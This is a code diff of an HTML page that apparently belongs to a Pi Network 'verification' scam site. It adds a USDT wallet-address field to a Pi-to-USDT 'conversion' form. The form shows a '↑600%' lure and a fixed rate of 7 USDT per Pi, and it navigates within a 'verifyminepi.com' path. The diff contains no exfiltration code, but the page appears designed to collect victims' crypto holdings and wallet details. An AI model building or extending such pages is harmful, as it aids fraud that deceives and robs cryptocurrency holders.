@@ -29,10 +29,12 @@
                 <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Next</button>
             </div>
         </div>
-        <!-- New option to fill Pi amount -->
+        <!-- New option to fill Pi amount and USDT wallet address -->
         <div class="pi-conversion">
             <label for="pi-amount">↑600%••Enter Pi Amount:</label>
             <input type="number" id="pi-amount" name="pi-amount" min="0" step="1" placeholder="Enter Pi amount">
+            <label for="usdt-wallet">USDT Wallet Address:</label>
+            <input type="text" id="usdt-wallet" name="usdt-wallet" placeholder="Enter USDT wallet address">
             <button onclick="convertToUSDT()">Convert to USDT</button>
             <p id="usdt-equivalent"></p>
             <div id="sell-button-container"></div>
@@ -50,6 +52,7 @@
 
         function convertToUSDT() {
             const piAmount = document.getElementById('pi-amount').value;
+            const usdtWallet = document.getElementById('usdt-wallet').value;
             const usdtEquivalent = piAmount * 7;
             document.getElementById('usdt-equivalent').textContent = `${piAmount} Pi is equivalent to ${usdtEquivalent} USDT`;
 
